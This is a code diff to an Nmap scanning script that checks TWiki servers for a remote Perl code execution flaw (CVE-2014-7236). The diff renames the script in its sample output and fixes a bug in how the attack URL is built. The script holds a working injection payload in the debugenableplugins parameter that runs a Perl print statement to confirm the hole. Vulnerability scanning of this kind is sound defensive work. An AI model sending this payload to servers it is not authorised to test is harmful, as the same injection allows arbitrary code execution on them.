@@ -18,7 +18,7 @@ unsanitized pearl commads via debugenableplugins request parameter.
 -- Scanned at 2015-03-23 05:57:32 IST for 3s
 -- PORT   STATE SERVICE REASON
 -- 80/tcp open  http    syn-ack
--- | http-vulns-cve2014-7236: 
+-- | http-vuln-cve2014-7236: 
 -- |   VULNERABLE:
 -- |   TWiki Remote Perl Code Execution vulnerability in versions (4.0.x-6.0.0)
 -- |     State: VULNERABLE (Exploitable)
@@ -68,7 +68,7 @@ action = function(host, port)
   local rand = string.lower(stdnse.generate_random_string(18))
   
   local payload =  '/'.. path .. '/do/view/Main/WebHome?debugenableplugins=BackupRestorePlugin%3bprint("Content-Type:text/html\\r\\n\\r\\n'..rand..'!")%3bexit'
-  payload = path:gsub('//','/')
+  payload = payload:gsub('//','/')
   local response= http.get(host,port,payload)
   
   if response.status == 200 and response.body:find(rand) then
